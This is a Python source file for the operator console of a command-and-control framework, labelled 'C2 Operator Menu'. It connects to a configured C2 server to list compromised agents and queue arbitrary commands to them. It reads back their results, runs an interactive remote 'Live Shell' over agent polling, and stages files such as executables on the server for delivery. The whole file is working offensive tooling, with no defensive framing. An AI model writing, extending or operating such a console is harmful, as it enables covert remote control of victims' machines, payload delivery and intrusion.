import requests, time
import sys
import json
import base64

with open("config.json") as f:
    cfg = json.load(f)

SERVER_URL = f"http://{cfg['server_host']}:{cfg['server_port']}"

# Colors
GREEN  = "\033[92m"
RED    = "\033[91m"
BLUE   = "\033[94m"
YELLOW = "\033[93m"
RESET  = "\033[0m"

def list_agents():
    try:
        response = requests.get(f"{SERVER_URL}/agents", timeout=10)
        response.raise_for_status()
        data = response.json()

        print(RED + "---- Agents ----" + RESET)
        if not data:
            print("No agents registered.")
            return
        for count, a in enumerate(data, start=1):
            print(f"{count}: {a['agent_id']} ({a['status']}) ({a['os_info']})")
    except Exception as e:
        print(RED + f"Error fetching agents: {e}" + RESET)

def list_tasks(status):
    try:
        response = requests.get(f"{SERVER_URL}/tasks/{status}", timeout=10)
        response.raise_for_status()
        data = response.json()

        print(RED + "Tasks Status " + status+ RESET)
        if not data:
            print("No tasks found.")
            return

        for count, cmd in enumerate(data, start=1):
            print(f"{YELLOW}{'-' * 100}{RESET}")
            print(f"Command Id : {cmd['Command Id']}")
            print(f"Agent Id   : {cmd['Agent Id']}")
            print(f"Command    : {cmd['Command']}")
            print(f"Status     : {cmd['Status']}")
            print(f"Result     :\n{cmd['Result']}")
        
    except Exception as e:
        print(f"Error fetching tasks: {e}")
  
def show_agent_commands():
    try:
        agent_id = input("Enter the Agent ID: ")
        response = requests.get(f"{SERVER_URL}/agents/{agent_id}", timeout=10)
        response.raise_for_status()
        data = response.json()
        commands = data.get("Commands", [])

        print(RED + "Agent Commands" + RESET)
        print(f"Agent: {agent_id}")

        if not commands:
            print("No commands found for this agent.")
            return

        for count, cmd in enumerate(commands, start=1):
            print(f"{YELLOW}{'-' * 100}{RESET}")
            print(f"Command ID : {cmd['Command Id']}")
            print(f"Command    : {cmd['Command']}")
            print(f"Status     : {cmd['Status']}")
            print(f"Result     :\n{cmd['Result']}")
            
    except Exception as e:
        print(RED + f"Error fetching agent commands: {e}" + RESET)

def send_command():
    id = input("Enter Agent ID: ").strip()
    command = input("Enter Command: ").strip()
    try:
        r = requests.post(
            f"{SERVER_URL}/queue",
            json={
                "agent_id": id,
                "command": command
            },
            timeout=10
        )
        r.raise_for_status() 

        if r.status_code == 200:
            print(f"[+] Command sent successfully to {id}")
        else:
            print(f"[!] Server returned status {r.status_code}")

    except Exception as e:
        print(f"[!] Failed to send command: {e}")

def stage_file():
    local_path = input("Enter local file path: ").strip()
    filename   = input("Enter filename to store on server (ex: tool.exe): ").strip()

    try:
        with open(local_path, "rb") as f:
            file_data = base64.b64encode(f.read()).decode()

        r = requests.post(
            f"{SERVER_URL}/stage_file",
            json={"filename": filename, "file_data": file_data},
            timeout=15
        )
        r.raise_for_status()
        resp = r.json()

        print(GREEN + f"[+] File {local_path} staged as {resp['filename']}" + RESET)
        print(f"Stored at: {resp['path']}")

    except Exception as e:
        print(RED + f"[!] Failed to stage file: {e}" + RESET)

def live_shell():
    agent_id = input("Enter Agent Id: ").strip()

    while True:
        command = input(f"{RED}{agent_id}{RESET}{BLUE} ${RESET} ").strip()
        if command.lower() in ["exit", "quit", "back"]:
            print("[*] Leaving live shell...")
            break

        # Queue the command (plaintext)
        payload = {"agent_id": agent_id, "command": command}
        r = requests.post(f"{SERVER_URL}/queue", json=payload, timeout=10)
        r.raise_for_status()
        resp = r.json()
        cmd_id = resp["command_id"]

        # Poll until result is ready
        while True:
            time.sleep(1)
            agent_resp = requests.get(f"{SERVER_URL}/agents/{agent_id}", timeout=10)
            agent_resp.raise_for_status()
            agent_data = agent_resp.json()

            for c in agent_data["Commands"]:
                if c["Command Id"] == cmd_id and c["Status"] == "Completed":
                    print(c["Result"])
                    break
            else:
                continue
            break


def main():
    while True:
        print(GREEN+"\n---------------------------------")
        print("C2 Operator Menu")
        print("---------------------------------"+RESET)
        print(BLUE + "1. List agents")
        print("2. Show agent details with commands and results")
        print("3. Send command to agent")
        print("4. List queued tasks")
        print("5. List completed tasks")
        print("6. Live Shell")
        print("7. Stage a file on server")
        print("8. Exit" + RESET)

        choice = input("Select an option: ").strip()
        print("\n")

        if choice == "1":
            list_agents()
        elif choice == "2":
            show_agent_commands()
        elif choice == "3":
            send_command()
        elif choice == "4":
            list_tasks("Queued")
        elif choice == "5":
            list_tasks("Completed")
        elif choice == "6":
            live_shell()
        elif choice == "7":
            stage_file()
        elif choice == "8":
            print("Exiting...")
            sys.exit(0)
        else:
            print("Invalid option. Try again.")


if __name__ == "__main__":
    main()